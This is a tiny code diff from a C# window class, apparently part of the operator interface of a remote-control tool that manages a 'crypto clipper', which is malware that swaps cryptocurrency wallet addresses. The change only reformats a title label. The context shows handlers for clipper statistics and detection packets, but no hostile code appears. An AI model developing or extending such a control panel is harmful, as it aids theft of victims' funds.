@@ -17,7 +17,7 @@ public partial class CryptoClipperWindow : Window
         InitializeComponent();
         _server   = server;
         _clientId = clientId;
-        TxtTitle.Text = $"  —  {clientLabel}";
+        TxtTitle.Text = clientLabel;
 
         _server.RegisterHandler(clientId, PacketType.ClipperStatsResult, OnStatsResult);
         _server.RegisterHandler(clientId, PacketType.ClipperDetected,    OnDetected);
